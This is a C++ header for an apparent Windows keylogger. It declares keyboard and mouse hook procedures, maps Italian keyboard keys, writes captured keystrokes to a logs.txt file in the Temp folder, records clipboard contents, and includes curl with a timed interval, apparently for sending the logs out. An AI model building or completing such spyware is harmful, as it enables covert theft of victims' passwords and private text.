#pragma once

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <iphlpapi.h>

#include "include/curl/curl.h"

#pragma comment(lib, "user32.lib") // user32.dll windows' library
#pragma comment(lib,"ws2_32.lib") // ws2_32.dll windows' library
#pragma comment(lib, "iphlpapi.lib") // iphlpapi.dll windows' library

#define VK_0	0x30	// '0'
#define VK_1	0x31	// '1'
#define VK_2	0x32	// '2'
#define VK_3	0x33	// '3'
#define VK_4	0x34	// '4'
#define VK_5	0x35	// '5'
#define VK_6	0x36	// '6'
#define VK_7	0x37	// '7'
#define VK_8	0x38	// '8'
#define VK_9	0x39	// '9'

#define VK_A	0x41	// 'A'
#define VK_B	0x42	// 'B'
#define VK_C	0x43	// 'C'
#define VK_D	0x44	// 'D'
#define VK_E	0x45	// 'E'
#define VK_F	0x46	// 'F'
#define VK_G	0x47	// 'G'
#define VK_H	0x48	// 'H'
#define VK_I	0x49	// 'I'
#define VK_J	0x4A	// 'J'
#define VK_K	0x4B	// 'K'
#define VK_L	0x4C	// 'L'
#define VK_M	0x4D	// 'M'
#define VK_N	0x4E	// 'N'
#define VK_O	0x4F	// 'O'
#define VK_P	0x50	// 'P'
#define VK_Q	0x51	// 'Q'
#define VK_R	0x52	// 'R'
#define VK_S	0x53	// 'S'
#define VK_T	0x54	// 'T'
#define VK_U	0x55	// 'U'
#define VK_V	0x56	// 'V'
#define VK_W	0x57	// 'W'
#define VK_X	0x58	// 'X'
#define VK_Y	0x59	// 'Y'
#define VK_Z	0x5A	// 'Z'

// redefine some keys for the Italian keyboard
// SC stay for "Special Characters" with accent
#define VK_SC_E				0xBA	// èé[{ (VK_OEM_3)
#define VK_SC_O				0xC0	// òç@	(VK_OEM_1)
#define VK_SC_A				0xDE	// à°#	(VK_OEM_7)
#define VK_SC_U				0xBF	// ù§	(VK_OEM_2)
#define VK_SC_I				0xDD	// ì^	(VK_OEM_6)
#define VK_BACKSLASH		0xDC	// \|	(VK_OEM_5)
#define VK_APOSTROPHE		0xDB	// '?	(VK_OEM_4)

char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFolder Path
DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed

std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
std::string contentFile = ""; // save everything of what is been writing down

const std::chrono::seconds waitTime = std::chrono::seconds(int(/* => minutes */ 90)); // seconds -> 15 minutes

class WindowsHook
{
private:
	HHOOK hHook;

public:
	WindowsHook();
	~WindowsHook();

	bool SetHook(int type);
	bool UnHook();
};

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);

std::string StartString();

